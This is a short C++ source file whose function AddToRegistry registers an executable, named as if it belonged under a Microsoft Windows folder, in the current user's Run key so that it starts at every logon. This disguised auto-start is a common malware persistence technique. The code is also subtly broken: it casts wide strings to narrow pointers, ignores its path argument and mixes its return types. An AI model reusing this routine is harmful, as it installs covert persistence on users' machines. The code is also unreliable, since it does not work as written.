#include "sys.h"
#include "stream.h"

int sys::AddToRegistry(const std::string &path, const std::string &name) {
  std::string win_path = stream::GetPath("\\Microsoft\\Windows\\");
  std::wstring w_win_path = std::wstring(win_path.begin(), win_path.end());
  std::wstring w_name = std::wstring(name.begin(), name.end());

  std::wstring full_path = w_win_path + w_name + L".exe";
  HKEY hkey = nullptr;
  LSTATUS ret_rck = RegCreateKey(HKEY_CURRENT_USER,
								 reinterpret_cast<LPCSTR>(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
								 &hkey);
  if (ret_rck!=ERROR_SUCCESS) {
	return -1;
  }

  LSTATUS ret_rsve = RegSetValueEx(hkey,
								   reinterpret_cast<LPCSTR>(w_name.c_str()),
								   0,
								   REG_SZ,
								   (BYTE *)full_path.c_str(),
								   (full_path.size() + 1)*sizeof(wchar_t));
  return ret_rsve==ERROR_SUCCESS;
}